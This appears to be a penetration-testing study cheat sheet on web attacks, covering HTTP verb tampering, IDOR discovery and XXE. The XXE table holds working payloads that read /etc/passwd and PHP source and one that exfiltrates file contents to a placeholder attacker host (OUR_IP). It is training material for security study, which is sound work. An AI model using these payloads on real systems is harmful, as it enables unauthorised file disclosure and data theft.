# Web Application Attacks  

>My [Burp Suite Certified Practitioner Study material](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md) cover some of the same topics listed here, with more detail.  
>[HackTheBox Academy Web Attacks](https://academy.hackthebox.com/module/134/section/1158)  

## HTTP Verb Tampering

>HTTP has 9 different [verbs](https://academy.hackthebox.com/module/134/section/1159) that can be accepted as HTTP methods by web servers.  
>[HTTP Request Methods Mozilla Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)  

`HTTP Method`
- `GET`
- `HEAD`
- `POST`
- `PUT`
- `DELETE`
- `CONNECT`
- `OPTIONS`
- `PATCH`
- `TRACE`
  
| **Command**   | **Description**   |
| --------------|-------------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

## IDOR

`Identify IDORS`
- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

## XXE

| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |